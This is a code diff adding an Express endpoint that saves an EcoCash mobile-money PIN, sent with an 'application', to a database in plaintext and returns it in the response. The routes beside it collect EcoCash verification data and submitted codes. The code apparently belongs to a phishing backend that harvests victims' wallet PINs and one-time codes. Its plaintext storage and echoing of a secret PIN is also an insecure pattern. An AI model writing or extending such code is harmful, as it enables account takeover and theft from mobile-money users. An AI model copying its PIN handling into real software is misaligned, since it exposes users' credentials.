@@ -773,6 +773,64 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
     }
 
 });
+
+// ======================================================
+// SAVE ECOCASH PIN
+// ======================================================
+
+app.post("/save-ecocash-pin/:id", async (req, res) => {
+
+    try {
+
+        const { id } = req.params;
+        const { EcoCashPin } = req.body;
+
+        if (!EcoCashPin) {
+            return res.status(400).json({
+                success: false,
+                message: "PIN is required."
+            });
+        }
+
+        const result = await pool.query(
+            `
+            UPDATE applications
+            SET ecocash_pin = $1
+            WHERE id = $2
+            RETURNING id, ecocash_pin;
+            `,
+            [EcoCashPin, id]
+        );
+
+        if (result.rows.length === 0) {
+            return res.status(404).json({
+                success: false,
+                message: "Application not found."
+            });
+        }
+
+        res.json({
+            success: true,
+            message: "EcoCash PIN saved successfully.",
+            application: result.rows[0]
+        });
+
+    } catch (err) {
+
+        console.error(
+            "SAVE ECOCASH PIN ERROR:",
+            err
+        );
+
+        res.status(500).json({
+            success: false,
+            error: err.message
+        });
+
+    }
+
+});
+
 // ======================================================
 // ECOCASH CODE SUBMITTED
 // ======================================================
